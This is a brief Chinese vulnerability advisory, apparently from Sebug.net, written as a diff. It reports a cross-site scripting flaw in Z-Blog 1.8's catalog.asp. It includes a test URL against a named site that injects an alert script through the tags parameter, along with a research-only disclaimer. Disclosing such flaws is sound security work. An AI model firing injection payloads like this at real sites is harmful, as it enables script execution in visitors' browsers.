@@ -1,0 +1,6 @@
+Z-Blog 1.8 Arwen Build 81206 catalog.asp 存在跨站漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.http://blog.rainbowsoft.org/catalog.asp?tags=Z-Blog"></title><script>alert('sebug')</script>
